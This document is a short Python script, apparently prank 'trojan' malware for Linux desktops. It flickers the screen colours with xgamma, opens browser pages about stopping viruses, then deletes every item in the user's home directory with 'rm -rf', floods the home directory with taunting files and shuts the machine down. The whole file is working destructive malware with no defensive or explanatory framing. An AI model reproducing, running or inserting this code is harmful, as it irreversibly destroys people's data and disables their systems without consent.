import os
import random
import subprocess
def remover():
    lister = subprocess.run("ls $HOME", shell=True, capture_output=True, text=True)
    for item in str(lister.stdout).splitlines():
        os.system(f"rm -rf $HOME/{item}")
    for i in range(0, 2000, 1):
        os.system(f"echo '{i}YOU LOST EVERYTHING BRO' >> $HOME/{i}You-Got-Trolled-By-troyan")
for i in range(0, 150, 1):
    r = random.randint(1,9)
    g = random.randint(1,9)
    b = random.randint(1,9)
    gamma = [0.1, 5.0, 10]
    choicer = random.choice(gamma)
    os.system(f"xgamma -rgamma 1 -ggamma {g} -bgamma {b}")
    os.system(f"xgamma -rgamma {r} -ggamma 1 -bgamma {b}")
    os.system(f"xgamma -rgamma {r} -ggamma {g} -bgamma 1")
    os.system(f"xgamma -gamma {choicer}")
    if '5' in str(i):
        os.system("xdg-open https://google.com/search?q=how%20stop%20a%20virus")
    elif '3' in str(i):
        os.system("xdg-open https://www.avast.com/pt-br/index")
    elif '7' in str(i) and os.path.exists("/bin/thunar") == True:
        os.system("thunar")
    else:
        continue
remover()
os.system("xgamma -rgamma 1 -ggamma 1 -bgamma 1")
os.system("xgamma -gamma 1")
os.system("shutdown -P now")